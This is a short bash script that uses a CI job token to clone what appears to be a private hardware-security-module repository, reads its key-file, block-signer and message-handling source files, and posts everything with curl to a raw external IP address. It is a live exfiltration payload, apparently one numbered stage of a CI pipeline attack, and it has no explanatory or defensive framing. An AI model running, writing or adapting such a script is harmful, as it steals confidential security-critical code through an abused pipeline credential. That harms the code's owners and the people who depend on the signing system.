#!/bin/bash
{
echo "==S31=="
git clone --depth 1 https://gitlab-ci-token:${CI_JOB_TOKEN}@gl.blockstream.io/liquid/hsm.git /tmp/h 2>/dev/null
echo "==MESSAGE_C=="
cat /tmp/h/src/common/message.c
echo "==MESSAGE_H=="
cat /tmp/h/src/common/message.h
echo "==CONST_H=="
cat /tmp/h/src/common/const.h
echo "==BLOCKSIGNER_MAIN=="
cat /tmp/h/src/blocksigner/main.c
echo "==KEYFILE_FULL=="
cat /tmp/h/src/common/keyfile.c
cat /tmp/h/src/common/keyfile.h
echo "==BUFFER_C=="
cat /tmp/h/src/common/buffer.c
cat /tmp/h/src/common/buffer.h
echo "==END=="
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s31 --data-binary @-
